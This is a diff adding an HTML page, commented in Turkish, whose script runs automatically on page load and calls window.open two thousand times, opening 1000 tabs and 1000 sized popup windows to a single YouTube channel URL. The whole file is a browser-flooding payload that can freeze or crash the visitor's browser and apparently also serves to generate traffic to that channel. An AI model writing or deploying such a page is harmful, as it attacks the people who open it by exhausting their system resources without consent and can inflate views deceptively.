@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yeni Sekmeler ve Pencereler Aç</title>
+</head>
+<body>
+
+<script>
+    const url = 'https://youtube.com/@muraterenschannel'; // Açmak istediğiniz URL
+    const numberOfTabs = 1000; // Açmak istediğiniz sekme sayısı
+    const numberOfWindows = 1000; // Açmak istediğiniz pencere sayısı
+
+    function openTabsAndWindows() {
+        // Sekmeleri aç
+        for (let i = 0; i < numberOfTabs; i++) {
+            window.open(url, '_blank');
+        }
+
+        // Pencereleri aç
+        for (let i = 0; i < numberOfWindows; i++) {
+            window.open(url, '_blank', 'width=800,height=600'); // Pencere boyutlarını ayarlayabilirsiniz
+        }
+    }
+
+    // Sayfa yüklendiğinde sekmeleri ve pencereleri aç
+    window.onload = openTabsAndWindows;
+</script>
+
+</body>
+</html>
